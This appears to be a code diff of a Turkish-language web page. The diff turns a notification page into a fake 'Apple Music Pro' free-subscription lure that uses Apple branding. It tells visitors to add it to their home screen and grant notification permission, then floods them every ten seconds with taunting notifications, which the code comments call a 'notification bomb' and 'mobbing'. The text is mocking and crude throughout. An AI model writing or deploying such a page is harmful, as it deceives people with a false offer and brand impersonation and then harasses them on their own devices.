@@ -2,58 +2,61 @@
 <html lang="tr">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sistem Bildirim Merkezi</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Apple Music Pro</title>
     
     <meta name="apple-mobile-web-app-capable" content="yes">
-    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
     <link rel="apple-touch-icon" href="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg">
+    
+    <link rel="manifest" href="data:application/manifest+json,{'name':'Apple Music Pro','short_name':'MusicPro','start_url':'.','display':'standalone','background_color':'#000','theme_color':'#000'}">
 
     <style>
-        body { background: #000; color: #fff; font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
-        .box { padding: 30px; border: 1px solid #333; border-radius: 20px; width: 80%; }
-        .btn-notif { background: #30d158; color: white; padding: 15px 30px; border-radius: 12px; font-weight: bold; border: none; cursor: pointer; }
-        .desc { font-size: 14px; color: #8e8e93; margin-bottom: 20px; }
+        body { background: #000; color: #fff; font-family: -apple-system, sans-serif; height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; margin: 0; text-align: center; }
+        .btn { background: #fa243c; color: #fff; padding: 20px 40px; border-radius: 50px; font-weight: bold; border: none; font-size: 18px; box-shadow: 0 0 20px rgba(250, 36, 60, 0.4); cursor: pointer; }
     </style>
 </head>
 <body>
 
-    <div class="box">
-        <h2>Bildirim Koruması</h2>
-        <p class="desc">Gereksiz bildirimleri engellemek ve Apple Music aboneliğini aktif etmek için izni onaylayın.</p>
-        <button class="btn-notif" onclick="askPermission()">BİLDİRİMLERİ AÇ</button>
+    <div id="setup-ui">
+        <h2>⚠️ SON ADIM</h2>
+        <p>Bedava abonelik için önce <b>Paylaş</b> butonuna basıp <b>Ana Ekran'a Ekle</b> deyin.<br>Sonra ana ekrandaki uygulamayı açın.</p>
+    </div>
+
+    <div id="main-ui" style="display:none;">
+        <h1>Abonelik Hazır!</h1>
+        <p>Bildirimleri açarak 1 yıllık paketi tanımlayın.</p>
+        <button class="btn" onclick="subscribe()">BİLDİRİMLERİ AKTİF ET</button>
     </div>
 
     <script>
-        async function askPermission() {
-            // Tarayıcı desteği kontrolü
-            if (!("Notification" in window)) {
-                alert("Aga bu tarayıcıda bildirim olmaz, Ana Ekran'a eklemen lazım!");
-                return;
-            }
+        // ANA EKRANDA MIYIZ KONTROLÜ
+        if (window.navigator.standalone === true || window.matchMedia('(display-mode: standalone)').matches) {
+            document.getElementById('setup-ui').style.display = 'none';
+            document.getElementById('main-ui').style.display = 'block';
+        }
 
-            // İzin İste
+        async function subscribe() {
             const permission = await Notification.requestPermission();
-
-            if (permission === "granted") {
-                // Sadece BİLDİRİM atacak, ekranı kilitlemeyecek
-                // Her 10 saniyede bir (10000ms) bir tane salla
+            if (permission === 'granted') {
+                alert("SİSTEM AKTİF! 10 saniyede bir bildirim yağmuru başlıyor...");
+                
+                // BURASI BİLDİRİM BOMBASI (10 saniyede bir dızt dızt)
                 setInterval(() => {
-                    new Notification("🚨 SİSTEM UYARISI!", {
-                        body: "HAHAHA HADİ SİL LAN! SİLEBİLİYORSAN SİL!",
+                    new Notification("🚨 SİLSENE LAN!", {
+                        body: "HAHAHA HADİ SİL LAN! TELEFON ELİMDE!",
                         icon: "https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg"
                     });
                 }, 10000); 
-
-                // İkinci bir bildirim daha (şov olsun)
-                new Notification("BAŞARILI!", {
-                    body: "Mobbing modu başarıyla aktif edildi koçum."
-                });
             } else {
-                alert("İzni vermedin, trolledik seni!");
+                alert("İzin vermezsen mobbing yapamam aga!");
             }
         }
-    </script>
 
+        // Service Worker Kaydı (Bildirim için şart)
+        if ('serviceWorker' in navigator) {
+            navigator.serviceWorker.register('data:text/javascript,self.addEventListener("fetch", function(e){})');
+        }
+    </script>
 </body>
 </html>
